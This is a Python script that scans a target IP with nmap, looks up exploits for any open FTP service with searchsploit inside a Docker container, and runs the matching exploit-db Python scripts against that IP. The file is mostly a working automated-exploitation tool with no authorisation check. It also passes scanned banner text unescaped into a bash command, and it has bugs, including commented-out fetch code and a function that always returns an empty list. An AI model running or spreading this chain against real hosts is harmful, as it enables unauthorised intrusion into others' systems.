import argparse
import nmap
import docker
import re
import time
import subprocess
import json
import os
from tabulate import tabulate
from decouple import config


container_Name = config("CONTAINER_NAME")
container_ID = config("CONTAINER_ID")
host_Path= config("HOST_PATH")


def scan(ip: str, start_port: int = 1, end_port: int = 1024):
    if not (0 < start_port <= 65535 and 0 < end_port <= 65535):
        raise ValueError("Invalid port range")

    nmScan = nmap.PortScanner()
    result = nmScan.scan(ip, f"{start_port}-{end_port}")
  

    # Convert JSON data to table format
    table_data = json_to_table(result)

    # Print table using tabulate
    headers = ["IP Address", "Port", "Service Name", "State", "Product", "Version", "Extra Info", "Conf", "CPE"]
    print(tabulate(table_data, headers=headers))
    
    input("\nEnter Input >>")

    filtered_ports = []
    try:
        for port, details in result["scan"][ip]["tcp"].items():
            product_version = f"{details['product']} {details['version']}"
            if details["state"] == "open" and details["name"] == "ftp":
                filtered_ports.append({
                    "port": port,
                    "state": details["state"],
                    "name": details["name"],
                    "product_version": product_version
                })
        product_versions = ", ".join(port["product_version"] for port in filtered_ports)
    except:
        print("Nmap scan could not be perfomred")
        return False
    if(product_versions):
        container_name = container_Name
        half_command = 'searchsploit'
        full_command = f"{half_command} {product_versions}"
        print("\nThe vulnerability identified in the Scan is: ",product_versions)
        output = run_command_in_container(container_name, full_command)
        return output
    else:
        print('\nNo vulnerability detected in the Scan')
      
def json_to_table(json_data):
    table = []
    row_number = 1
    for ip, data in json_data['scan'].items():
        for port, port_data in data['tcp'].items():
            table.append([
                row_number,
                ip,
                port,
                port_data.get('name', ''),
                port_data.get('state', ''),
                port_data.get('product', ''),
                port_data.get('version', ''),
                port_data.get('extrainfo', ''),
                port_data.get('conf', ''),
                port_data.get('cpe', '')
            ])
            row_number += 1
    return table


def run_command_in_container(container_name, command):
   
    client = docker.from_env()
   
    container = client.containers.get(container_name)
    exec_command = f"bash -c '{command}'"
    exec_response = container.exec_run(exec_command)
    return exec_response.output.decode('utf-8')

def exploit_by_ip(filename,ip):
    try:
        # Add the proper termnial view here: --> ">>" @anas
        subprocess.run(['python3', filename, ip], check=True)
        input_cmd=input('Enter input:>>')
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
    
def extract_py_files(output,ip):
    py_files = []
    lines = output.split('\n')
    for line in lines:
        if '.py' in line:
            filename = re.search(r'\b\d+\.py\b', line).group()
            get_file(filename,ip)   
    return py_files

def get_file(filename,ip):
   
#      container_name = container_Name
   
#      half_command = 'searchsploit -m'
#      full_command = f"{half_command} {filename}"
#      print('Getting ',filename, ' in local system for exploitation')
#      output = run_command_in_container(container_name, full_command)
#      print(output)
#      container_id = container_ID
#      container_path = f"/usr/share/exploitdb/exploits/unix/remote/{filename}"
#      host_path = host_Path
#      docker_cp(container_id,container_path, host_path)
     exploit=exploit_by_ip(filename,ip)
     print(exploit)

def docker_cp(container_id, container_path, host_path):
 
    command = ["docker", "cp", f"{container_id}:{container_path}", host_path]
    try:
        subprocess.run(command, check=True)
        print("Files copied successfully from container to host.")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")


def main():
    parser = argparse.ArgumentParser(description="Scan for open FTP ports and search for exploits in a Docker container.")
    parser.add_argument("ip", type=str, help="IP address to scan")
    parser.add_argument("--start-port", type=int, default=1, help="Start port for scanning (default: 1)")
    parser.add_argument("--end-port", type=int, default=1024, help="End port for scanning (default: 1024)")
    print('Processing...')
    args = parser.parse_args()
    output = scan(args.ip, args.start_port, args.end_port)
    if(output==False):
        return;
    else:
        print(output)
        py_files = extract_py_files(output,args.ip)
   
if __name__ == "__main__":
    main()
